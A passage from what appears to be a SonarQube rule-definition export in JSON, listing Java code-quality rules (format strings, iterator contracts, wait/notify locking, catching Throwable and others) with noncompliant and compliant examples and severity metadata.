one\n\nMessageFormat.format(\"Result {1}.\", value); // Noncompliant; Not enough arguments. (first element is {0})\nMessageFormat.format(\"Result {{0}.\", value); // Noncompliant; Unbalanced number of curly brace (single curly braces should be escaped)\nMessageFormat.format(\"Result ' {0}\", value); // Noncompliant; Unbalanced number of quotes (single quote must be escaped)\n\njava.util.logging.Logger logger;\nlogger.log(java.util.logging.Level.SEVERE, \"Result {1}!\", 14); // Noncompliant - Not enough arguments.\n\norg.slf4j.Logger slf4jLog;\norg.slf4j.Marker marker;\n\nslf4jLog.debug(marker, \"message {}\"); // Noncompliant - Not enough arguments.\n\norg.apache.logging.log4j.Logger log4jLog;\nlog4jLog.debug(\"message {}\"); // Noncompliant - Not enough arguments.\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString.format(\"The value of my integer is %d\", 3);\nString.format(\"Duke's Birthday year is %tY\", c);\nString.format(\"Display %1$d and then %d\", 1);\nString.format(\"Not enough arguments %d and %d\", 1, 2);\nString.format(\"%d is equals to %&lt;\", 2);\n\nMessageFormat.format(\"Result {0}.\", value);\nMessageFormat.format(\"Result {0} &amp; {1}.\", value, value);\nMessageFormat.format(\"Result {0}.\", myObject);\n\njava.util.logging.Logger logger;\nlogger.log(java.util.logging.Level.SEVERE, \"Result {1},{2}!\", 14, 2);\n\norg.slf4j.Logger slf4jLog;\norg.slf4j.Marker marker;\n\nslf4jLog.debug(marker, \"message {}\", 1);\n\norg.apache.logging.log4j.Logger log4jLog;\nlog4jLog.debug(\"message {}\", 1);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.securecoding.cert.org/confluence/x/wQA1\">CERT, FIO47-C.</a> - Use valid format strings </li>\n</ul>",
            "mdDesc": "<p>Because <code>printf</code>-style format strings are interpreted at runtime, rather than validated by the Java compiler, they can contain errors\nthat lead to unexpected behavior or runtime errors. This rule statically validates the good behavior of <code>printf</code>-style formats when calling\nthe <code>format(...)</code> methods of <code>java.util.Formatter</code>, <code>java.lang.String</code>, <code>java.io.PrintStream</code>,\n<code>MessageFormat</code>, and <code>java.io.PrintWriter</code> classes and the <code>printf(...)</code> methods of <code>java.io.PrintStream</code>\nor <code>java.io.PrintWriter</code> classes. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString.format(\"The value of my integer is %d\", \"Hello World\");  // Noncompliant; an 'int' is expected rather than a String\nString.format(\"Duke's Birthday year is %tX\", c);  //Noncompliant; X is not a supported time conversion character\nString.format(\"Display %0$d and then %d\", 1);   //Noncompliant; arguments are numbered starting from 1\nString.format(\"Not enough arguments %d and %d\", 1);  //Noncompliant; the second argument is missing\nString.format(\"%&lt; is equals to %d\", 2);   //Noncompliant; the argument index '&lt;' refers to the previous format specifier but there isn't one\n\nMessageFormat.format(\"Result {1}.\", value); // Noncompliant; Not enough arguments. (first element is {0})\nMessageFormat.format(\"Result {{0}.\", value); // Noncompliant; Unbalanced number of curly brace (single curly braces should be escaped)\nMessageFormat.format(\"Result ' {0}\", value); // Noncompliant; Unbalanced number of quotes (single quote must be escaped)\n\njava.util.logging.Logger logger;\nlogger.log(java.util.logging.Level.SEVERE, \"Result {1}!\", 14); // Noncompliant - Not enough arguments.\n\norg.slf4j.Logger slf4jLog;\norg.slf4j.Marker marker;\n\nslf4jLog.debug(marker, \"message {}\"); // Noncompliant - Not enough arguments.\n\norg.apache.logging.log4j.Logger log4jLog;\nlog4jLog.debug(\"message {}\"); // Noncompliant - Not enough arguments.\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString.format(\"The value of my integer is %d\", 3);\nString.format(\"Duke's Birthday year is %tY\", c);\nString.format(\"Display %1$d and then %d\", 1);\nString.format(\"Not enough arguments %d and %d\", 1, 2);\nString.format(\"%d is equals to %&lt;\", 2);\n\nMessageFormat.format(\"Result {0}.\", value);\nMessageFormat.format(\"Result {0} &amp; {1}.\", value, value);\nMessageFormat.format(\"Result {0}.\", myObject);\n\njava.util.logging.Logger logger;\nlogger.log(java.util.logging.Level.SEVERE, \"Result {1},{2}!\", 14, 2);\n\norg.slf4j.Logger slf4jLog;\norg.slf4j.Marker marker;\n\nslf4jLog.debug(marker, \"message {}\", 1);\n\norg.apache.logging.log4j.Logger log4jLog;\nlog4jLog.debug(\"message {}\", 1);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.securecoding.cert.org/confluence/x/wQA1\">CERT, FIO47-C.</a> - Use valid format strings </li>\n</ul>",
            "severity": "BLOCKER",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S5664",
            "repo": "java",
            "name": "Whitespace for text block indent should be consistent",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Either use only spaces or only tabs for the indentation of a text block. Mixing white space will lead to a result with irregular indentation.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString textBlock = \"\"\"\n        this is\n&lt;tab&gt;text block!\n        !!!!\n      \"\"\";\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString textBlock = \"\"\"\n        this is\n        text block!\n        !!!!\n      \"\"\";\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://openjdk.java.net/jeps/368\">JEP 368: Text Blocks</a> (Second Preview) </li>\n  <li> <a href=\"https://cr.openjdk.java.net/~jlaskey/Strings/TextBlocksGuide_v9.html\">Programmer's Guide To Text Blocks</a>, by Jim Laskey and Stuart\n  Marks </li>\n</ul>",
            "mdDesc": "<p>Either use only spaces or only tabs for the indentation of a text block. Mixing white space will lead to a result with irregular indentation.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString textBlock = \"\"\"\n        this is\n&lt;tab&gt;text block!\n        !!!!\n      \"\"\";\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString textBlock = \"\"\"\n        this is\n        text block!\n        !!!!\n      \"\"\";\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://openjdk.java.net/jeps/368\">JEP 368: Text Blocks</a> (Second Preview) </li>\n  <li> <a href=\"https://cr.openjdk.java.net/~jlaskey/Strings/TextBlocksGuide_v9.html\">Programmer's Guide To Text Blocks</a>, by Jim Laskey and Stuart\n  Marks </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "java14"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1185",
            "repo": "java",
            "name": "Overriding methods should do more than simply call the same method in the super class",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Overriding a method just to call the same method from the super class without performing any other actions is useless and misleading. The only time\nthis is justified is in <code>final</code> overriding methods, where the effect is to lock in the parent class behavior. This rule ignores such\noverrides of <code>equals</code>, <code>hashCode</code> and <code>toString</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void doSomething() {\n  super.doSomething();\n}\n\n@Override\npublic boolean isLegal(Action action) {\n  return super.isLegal(action);\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@Override\npublic boolean isLegal(Action action) {         // Compliant - not simply forwarding the call\n  return super.isLegal(new Action(/* ... */));\n}\n\n@Id\n@Override\npublic int getId() {                            // Compliant - there is annotation different from @Override\n  return super.getId();\n}\n</pre>",
            "mdDesc": "<p>Overriding a method just to call the same method from the super class without performing any other actions is useless and misleading. The only time\nthis is justified is in <code>final</code> overriding methods, where the effect is to lock in the parent class behavior. This rule ignores such\noverrides of <code>equals</code>, <code>hashCode</code> and <code>toString</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void doSomething() {\n  super.doSomething();\n}\n\n@Override\npublic boolean isLegal(Action action) {\n  return super.isLegal(action);\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@Override\npublic boolean isLegal(Action action) {         // Compliant - not simply forwarding the call\n  return super.isLegal(new Action(/* ... */));\n}\n\n@Id\n@Override\npublic int getId() {                            // Compliant - there is annotation different from @Override\n  return super.getId();\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "clumsy",
                "redundant"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2154",
            "repo": "java",
            "name": "Dissimilar primitive wrappers should not be used with the ternary operator without explicit casting",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>If wrapped primitive values (e.g. <code>Integers</code> and <code>Floats</code>) are used in a ternary operator (e.g. <code>a?b:c</code>), both\nvalues will be unboxed and coerced to a common type, potentially leading to unexpected results. To avoid this, add an explicit cast to a compatible\ntype.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nInteger i = 123456789;\nFloat f = 1.0f;\nNumber n = condition ? i : f;  // Noncompliant; i is coerced to float. n = 1.23456792E8\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nInteger i = 123456789;\nFloat f = 1.0f;\nNumber n = condition ? (Number) i : f;  // n = 123456789\n</pre>",
            "mdDesc": "<p>If wrapped primitive values (e.g. <code>Integers</code> and <code>Floats</code>) are used in a ternary operator (e.g. <code>a?b:c</code>), both\nvalues will be unboxed and coerced to a common type, potentially leading to unexpected results. To avoid this, add an explicit cast to a compatible\ntype.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nInteger i = 123456789;\nFloat f = 1.0f;\nNumber n = condition ? i : f;  // Noncompliant; i is coerced to float. n = 1.23456792E8\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nInteger i = 123456789;\nFloat f = 1.0f;\nNumber n = condition ? (Number) i : f;  // n = 123456789\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S4454",
            "repo": "java",
            "name": "\"equals\" method parameters should not be marked \"@Nonnull\"",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>By contract, the <code>equals(Object)</code> method, from <code>java.lang.Object</code>, should accept a <code>null</code> argument. Among all the\nother cases, the <code>null</code> case is even explicitly detailed in the <code>Object.equals(...)</code> Javadoc, stating \"_For any non-null\nreference value x, x.equals(null) should return false._\"</p>\n<p>Assuming that the argument to <code>equals</code> is always non-null, and enforcing that assumption with an annotation is not only a fundamental\nviolation of the contract of <code>equals</code>, but it is also likely to cause problems in the future as the use of the class evolves over time.</p>\n<p>The rule raises an issue when the <code>equals</code> method is overridden and its parameter annotated with any kind of <code>@Nonnull</code>\nannotation.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic boolean equals(@javax.annotation.Nonnull Object obj) { // Noncompliant\n  // ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic boolean equals(Object obj) {\n  if (obj == null) {\n    return false;\n  }\n  // ...\n}\n</pre>",
            "mdDesc": "<p>By contract, the <code>equals(Object)</code> method, from <code>java.lang.Object</code>, should accept a <code>null</code> argument. Among all the\nother cases, the <code>null</code> case is even explicitly detailed in the <code>Object.equals(...)</code> Javadoc, stating \"_For any non-null\nreference value x, x.equals(null) should return false._\"</p>\n<p>Assuming that the argument to <code>equals</code> is always non-null, and enforcing that assumption with an annotation is not only a fundamental\nviolation of the contract of <code>equals</code>, but it is also likely to cause problems in the future as the use of the class evolves over time.</p>\n<p>The rule raises an issue when the <code>equals</code> method is overridden and its parameter annotated with any kind of <code>@Nonnull</code>\nannotation.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic boolean equals(@javax.annotation.Nonnull Object obj) { // Noncompliant\n  // ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic boolean equals(Object obj) {\n  if (obj == null) {\n    return false;\n  }\n  // ...\n}\n</pre>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "3min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "3min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "3min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "3min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3008",
            "repo": "java",
            "name": "Static non-final field names should comply with a naming convention",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Shared naming conventions allow teams to collaborate efficiently. This rule checks that static non-final field names match a provided regular\nexpression.</p>\n<h2>Noncompliant Code Example</h2>\n<p>With the default regular expression <code>^[a-z][a-zA-Z0-9]*$</code>:</p>\n<pre>\npublic final class MyClass {\n   private static String foo_bar;\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass MyClass {\n   private static String fooBar;\n}\n</pre>",
            "mdDesc": "<p>Shared naming conventions allow teams to collaborate efficiently. This rule checks that static non-final field names match a provided regular\nexpression.</p>\n<h2>Noncompliant Code Example</h2>\n<p>With the default regular expression <code>^[a-z][a-zA-Z0-9]*$</code>:</p>\n<pre>\npublic final class MyClass {\n   private static String foo_bar;\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass MyClass {\n   private static String fooBar;\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "convention"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "format",
                    "htmlDesc": "Regular expression used to check the field names against.",
                    "defaultValue": "^[a-z][a-zA-Z0-9]*$",
                    "type": "STRING"
                }
            ],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2151",
            "repo": "java",
            "name": "\"runFinalizersOnExit\" should not be called",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Running finalizers on JVM exit is disabled by default. It can be enabled with <code>System.runFinalizersOnExit</code> and\n<code>Runtime.runFinalizersOnExit</code>, but both methods are deprecated because they are are inherently unsafe. </p>\n<p>According to the Oracle Javadoc:</p>\n<blockquote>\n  <p>It may result in finalizers being called on live objects while other threads are concurrently manipulating those objects, resulting in erratic\n  behavior or deadlock.</p>\n</blockquote>\n<p>If you really want to be execute something when the virtual machine begins its shutdown sequence, you should attach a shutdown hook. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic static void main(String [] args) {\n  ...\n  System.runFinalizersOnExit(true);  // Noncompliant\n  ...\n}\n\nprotected void finalize(){\n  doSomething();\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic static void main(String [] args) {\n  Runtime.addShutdownHook(new Runnable() {\n    public void run(){\n      doSomething();\n    }\n  });\n  //...\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/4jZGBQ\">CERT, MET12-J.</a> - Do not use finalizers </li>\n</ul>",
            "mdDesc": "<p>Running finalizers on JVM exit is disabled by default. It can be enabled with <code>System.runFinalizersOnExit</code> and\n<code>Runtime.runFinalizersOnExit</code>, but both methods are deprecated because they are are inherently unsafe. </p>\n<p>According to the Oracle Javadoc:</p>\n<blockquote>\n  <p>It may result in finalizers being called on live objects while other threads are concurrently manipulating those objects, resulting in erratic\n  behavior or deadlock.</p>\n</blockquote>\n<p>If you really want to be execute something when the virtual machine begins its shutdown sequence, you should attach a shutdown hook. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic static void main(String [] args) {\n  ...\n  System.runFinalizersOnExit(true);  // Noncompliant\n  ...\n}\n\nprotected void finalize(){\n  doSomething();\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic static void main(String [] args) {\n  Runtime.addShutdownHook(new Runnable() {\n    public void run(){\n      doSomething();\n    }\n  });\n  //...\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/4jZGBQ\">CERT, MET12-J.</a> - Do not use finalizers </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "20min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "20min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "20min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "20min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S2272",
            "repo": "java",
            "name": "\"Iterator.next()\" methods should throw \"NoSuchElementException\"",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>By contract, any implementation of the <code>java.util.Iterator.next()</code> method should throw a <code>NoSuchElementException</code> exception\nwhen the iteration has no more elements. Any other behavior when the iteration is done could lead to unexpected behavior for users of this\n<code>Iterator</code>. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyIterator implements Iterator&lt;String&gt;{\n  ...\n  public String next(){\n    if(!hasNext()){\n      return null;\n    }\n    ...\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class MyIterator implements Iterator&lt;String&gt;{\n  ...\n  public String next(){\n    if(!hasNext()){\n      throw new NoSuchElementException();\n    }\n    ...\n  }\n}\n</pre>",
            "mdDesc": "<p>By contract, any implementation of the <code>java.util.Iterator.next()</code> method should throw a <code>NoSuchElementException</code> exception\nwhen the iteration has no more elements. Any other behavior when the iteration is done could lead to unexpected behavior for users of this\n<code>Iterator</code>. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyIterator implements Iterator&lt;String&gt;{\n  ...\n  public String next(){\n    if(!hasNext()){\n      return null;\n    }\n    ...\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class MyIterator implements Iterator&lt;String&gt;{\n  ...\n  public String next(){\n    if(!hasNext()){\n      throw new NoSuchElementException();\n    }\n    ...\n  }\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "error-handling",
                "unpredictable"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S2273",
            "repo": "java",
            "name": "\"wait\", \"notify\" and \"notifyAll\" should only be called when a lock is obviously held on an object",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>By contract, the method <code>Object.wait(...)</code>, <code>Object.notify()</code> and <code>Object.notifyAll()</code> should be called by a\nthread that is the owner of the object's monitor. If this is not the case an <code>IllegalMonitorStateException</code> exception is thrown. This rule\nreinforces this constraint by making it mandatory to call one of these methods only inside a <code>synchronized</code> method or statement. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nprivate void removeElement() {\n  while (!suitableCondition()){\n    obj.wait();\n  }\n  ... // Perform removal\n}\n</pre>\n<p>or</p>\n<pre>\nprivate void removeElement() {\n  while (!suitableCondition()){\n    wait();\n  }\n  ... // Perform removal\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nprivate void removeElement() {\n  synchronized(obj) {\n    while (!suitableCondition()){\n      obj.wait();\n    }\n    ... // Perform removal\n  }\n}\n</pre>\n<p>or</p>\n<pre>\nprivate synchronized void removeElement() {\n  while (!suitableCondition()){\n    wait();\n  }\n  ... // Perform removal\n}\n</pre>",
            "mdDesc": "<p>By contract, the method <code>Object.wait(...)</code>, <code>Object.notify()</code> and <code>Object.notifyAll()</code> should be called by a\nthread that is the owner of the object's monitor. If this is not the case an <code>IllegalMonitorStateException</code> exception is thrown. This rule\nreinforces this constraint by making it mandatory to call one of these methods only inside a <code>synchronized</code> method or statement. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nprivate void removeElement() {\n  while (!suitableCondition()){\n    obj.wait();\n  }\n  ... // Perform removal\n}\n</pre>\n<p>or</p>\n<pre>\nprivate void removeElement() {\n  while (!suitableCondition()){\n    wait();\n  }\n  ... // Perform removal\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nprivate void removeElement() {\n  synchronized(obj) {\n    while (!suitableCondition()){\n      obj.wait();\n    }\n    ... // Perform removal\n  }\n}\n</pre>\n<p>or</p>\n<pre>\nprivate synchronized void removeElement() {\n  while (!suitableCondition()){\n    wait();\n  }\n  ... // Perform removal\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "multi-threading"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "20min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "20min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "20min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "20min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S2391",
            "repo": "java",
            "name": "JUnit framework methods should be declared properly",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>If the <code>suite</code> method in a JUnit 3 <code>TestCase</code> is not declared correctly, it will not be used. Such a method must be named\n\"suite\", have no arguments, be <code>public static</code>, and must return either a <code>junit.framework.Test</code> or a\n<code>junit.framework.TestSuite</code>.</p>\n<p>Similarly, <code>setUp</code> and <code>tearDown</code> methods that aren't properly capitalized will also be ignored.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nTest suite() { ... } // Noncompliant; must be public static\npublic static boolean suite() { ... } // Noncompliant; wrong return type\npublic static Test suit() { ... } // Noncompliant; typo in method name\npublic static Test suite(int count) { ... } // Noncompliant; must be no-arg\n\npublic void setup() { ... } // Noncompliant; should be setUp\npublic void tearDwon() { ... } // Noncompliant; should be tearDown\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic static Test suite() { ... }\npublic void setUp() { ... }\npublic void tearDown() { ... }\n</pre>\n<h2>Deprecated</h2>\n<p>This rule is deprecated, and will eventually be removed.</p>",
            "mdDesc": "<p>If the <code>suite</code> method in a JUnit 3 <code>TestCase</code> is not declared correctly, it will not be used. Such a method must be named\n\"suite\", have no arguments, be <code>public static</code>, and must return either a <code>junit.framework.Test</code> or a\n<code>junit.framework.TestSuite</code>.</p>\n<p>Similarly, <code>setUp</code> and <code>tearDown</code> methods that aren't properly capitalized will also be ignored.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nTest suite() { ... } // Noncompliant; must be public static\npublic static boolean suite() { ... } // Noncompliant; wrong return type\npublic static Test suit() { ... } // Noncompliant; typo in method name\npublic static Test suite(int count) { ... } // Noncompliant; must be no-arg\n\npublic void setup() { ... } // Noncompliant; should be setUp\npublic void tearDwon() { ... } // Noncompliant; should be tearDown\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic static Test suite() { ... }\npublic void setUp() { ... }\npublic void tearDown() { ... }\n</pre>\n<h2>Deprecated</h2>\n<p>This rule is deprecated, and will eventually be removed.</p>",
            "severity": "BLOCKER",
            "status": "DEPRECATED",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1181",
            "repo": "java",
            "name": "Throwable and Error should not be caught",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p><code>Throwable</code> is the superclass of all errors and exceptions in Java. <code>Error</code> is the superclass of all errors, which are not\nmeant to be caught by applications.</p>\n<p>Catching either <code>Throwable</code> or <code>Error</code> will also catch <code>OutOfMemoryError</code> and <code>InternalError</code>, from\nwhich an application should not attempt to recover.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\ntry { /* ... */ } catch (Throwable t) { /* ... */ }\ntry { /* ... */ } catch (Error e) { /* ... */ }\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\ntry { /* ... */ } catch (RuntimeException e) { /* ... */ }\ntry { /* ... */ } catch (MyException e) { /* ... */ }\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/396.html\">MITRE, CWE-396</a> - Declaration of Catch for Generic Exception </li>\n  <li> <a href=\"https://github.com/isocpp/CppCoreGuidelines/blob/036324/CppCoreGuidelines.md#Re-exception-types\">C++ Core Guidelines E.14</a> - Use\n  purpose-designed user-defined types as exceptions (not built-in types) </li>\n</ul>",
            "mdDesc": "<p><code>Throwable</code> is the superclass of all errors and exceptions in Java. <code>Error</code> is the superclass of all errors, which are not\nmeant to be caught by applications.</p>\n<p>Catching either <code>Throwable</code> or <code>Error</code> will also catch <code>OutOfMemoryError</code> and <code>InternalError</code>, from\nwhich an application should not attempt to recover.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\ntry { /* ... */ } catch (Throwable t) { /* ... */ }\ntry { /* ... */ } catch (Error e) { /* ... */ }\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\ntry { /* ... */ } catch (RuntimeException e) { /* ... */ }\ntry { /* ... */ } catch (MyException e) { /* ... */ }\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/396.html\">MITRE, CWE-396</a> - Declaration of Catch for Generic Exception </li>\n  <li> <a href=\"https://github.com/isocpp/CppCoreGuidelines/blob/036324/CppCoreGuidelines.md#Re-exception-types\">C++ Core Guidelines E.14</a> - Use\n  purpose-designed user-defined types as exceptions (not built-in types) </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "bad-practice",
                "cert",
                "cppcoreguidelines",
                "cwe",
                "error-handling"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "20min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "20min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "20min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "20min",
